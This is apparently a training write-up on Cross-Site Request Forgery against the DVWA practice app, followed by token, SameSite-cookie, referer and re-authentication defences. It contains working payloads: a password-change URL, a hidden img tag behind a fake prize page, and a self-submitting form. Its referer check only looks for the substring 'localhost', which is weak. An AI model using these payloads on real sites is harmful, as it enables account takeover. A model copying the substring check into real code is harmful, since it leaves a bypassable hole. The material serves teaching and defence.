# CSRF — Attack & Mitigation Scenario

**Target:** DVWA (Damn Vulnerable Web Application)  
**Vulnerability:** Cross-Site Request Forgery  
**Severity:** High

---

## Attack Scenario

### Step 1: Identify the vulnerable action

DVWA CSRF page allows password change via a simple GET request:

```
http://localhost/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

No CSRF token is required — any request with valid session cookies will succeed.

### Step 2: Craft the attack page

Attacker creates a malicious HTML page:

```html
<html>
<head><title>Free Gift Card!</title></head>
<body>
  <h1>Congratulations! Click below to claim your prize.</h1>

  <!-- Hidden CSRF attack -->
  <img src="http://localhost/DVWA/vulnerabilities/csrf/?password_new=attacker123&password_conf=attacker123&Change=Change"
       width="0" height="0" style="display:none">

  <a href="#">Claim Your Prize</a>
</body>
</html>
```

### Step 3: Execute the attack

1. Admin logs into DVWA (session cookie stored in browser)
2. Admin visits the attacker's malicious page
3. Browser automatically sends the password change request with admin's session cookie
4. Admin's password is changed to `attacker123` without their knowledge

### Alternative: Auto-submit form

```html
<html>
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="http://localhost/DVWA/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked">
    <input type="hidden" name="password_conf" value="hacked">
    <input type="hidden" name="Change" value="Change">
  </form>
</body>
</html>
```

---

## Impact

| Action | Consequence |
|--------|-------------|
| Password changed | Attacker gains account access |
| Email changed | Password reset goes to attacker |
| Admin privileges granted | Full application compromise |
| Funds transferred | Financial loss |

---

## Mitigation: CSRF Token

### Implementation

```php
// Generate token on page load
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Include in form
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// Validate on submission
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    http_response_code(403);
    die('CSRF token validation failed');
}
```

### Why This Works

- Attacker cannot read the token (same-origin policy)
- Attacker cannot guess a 64-character random hex string
- Each session gets a unique token
- Token is validated server-side on every state-changing request

---

## Additional Defenses

### SameSite Cookies

```php
setcookie("PHPSESSID", $session_id, [
    "samesite" => "Strict",
    "httponly" => true,
    "secure" => true
]);
```

### Referer Validation

```php
$referer = $_SERVER['HTTP_REFERER'] ?? '';
if (strpos($referer, 'localhost') === false) {
    die('Invalid request origin');
}
```

### Re-authentication for Sensitive Actions

```php
// Require current password before allowing password change
if (!password_verify($_POST['current_password'], $stored_hash)) {
    die('Current password required');
}
```

---

## Before vs After

| Test | Without Token | With Token |
|------|--------------|------------|
| Direct URL password change | Succeeds | Blocked (no token) |
| Malicious page with img tag | Succeeds | Blocked (no token) |
| Auto-submit form attack | Succeeds | Blocked (no token) |
| Legitimate form submission | Succeeds | Succeeds (token included) |

---

## DVWA Security Levels

| Level | Protection | Exploitable |
|-------|-----------|-------------|
| Low | None | Yes — GET request |
| Medium | Referer check (bypassable) | Yes — with referer header |
| High | CSRF token (predictable) | Yes — token in page source |
| Impossible | Secure random token | No |
